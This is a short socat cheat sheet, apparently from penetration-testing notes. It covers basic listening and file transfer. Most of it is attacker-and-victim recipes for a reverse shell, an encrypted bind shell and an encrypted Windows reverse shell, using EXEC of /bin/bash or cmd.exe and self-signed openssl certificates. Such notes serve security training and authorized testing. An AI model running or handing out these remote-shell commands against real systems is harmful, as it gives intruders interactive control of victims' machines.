# Socat

## Common Options

* \-d : increase verbosity

## Usage

### Simple server / client

```
$ socat TCP4-LISTEN:8080 STDOUT
$ socat TCP4:127.0.0.1:8080
```

### File transfer

```
# Server --> Client
$ socat TCP4-LISTEN:8080,fork file:sharing.txt
$ socat TCP4:127.0.0.1:8080 file:incoming.txt,create
```

### Shells

#### Reverse Shell

```
# Attacker
$ socat -d -d TCP4-LISTEN:8080 STDOUT

# Victim
$ socat TCP4:127.0.0.1:8080 EXEC:/bin/bash
```

#### Encrypted Bind Shell

```
# Victim

# Generate new private key and certificate
$ openssl req -newkey rsa:2048 -nodes -keyout bindshell.key -x509 -days 365 -out bindshell.crt
$ cat bindshell.key bindshell.crt > bindshell.pem
$ sudo socat OPENSSL-LISTEN:443,cert=bindshell.pem,verify=0,fork EXEC:/bin/bash

# Attacker

$ socat - OPENSSL:127.0.0.1:443,verify=0
```

#### Encrypted Reverse Shell

```
# Attacker (Linux)

# Generate new private key and certificate
$ openssl req -newkey rsa:2048 -nodes -keyout revshell.key -x509 -days 365 -out revshell.crt
$ cat revshell.key revshell.crt > revshell.pem
$ sudo socat OPENSSL-LISTEN:443,cert=revshell.pem,verify=0,fork STDOUT

# Victim (Windows)

$ socat OPENSSL:127.0.0.1:443,verify=0 EXEC:'cmd.exe',pipes
```
